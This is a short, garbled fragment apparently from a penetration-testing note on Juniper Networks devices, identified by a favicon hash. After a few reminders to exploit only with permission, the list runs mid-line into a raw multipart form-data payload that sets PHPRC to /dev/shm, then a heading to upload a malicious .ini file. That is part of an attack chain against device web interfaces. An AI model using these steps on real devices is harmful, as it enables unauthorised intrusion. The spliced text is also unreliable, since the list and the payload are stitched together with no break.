...
## Juniper Networks (Favicon Hash: 2141724739)
...
-   Validate vulnerability exists
-   Only exploit with permission
-   Prefer non-destructive PoCs--X\r\nContent-Disposition: form-data; name="PHPRC"\r\n\r\n/dev/shm\r\n--X--'

# Step 2: Upload malicious .ini file
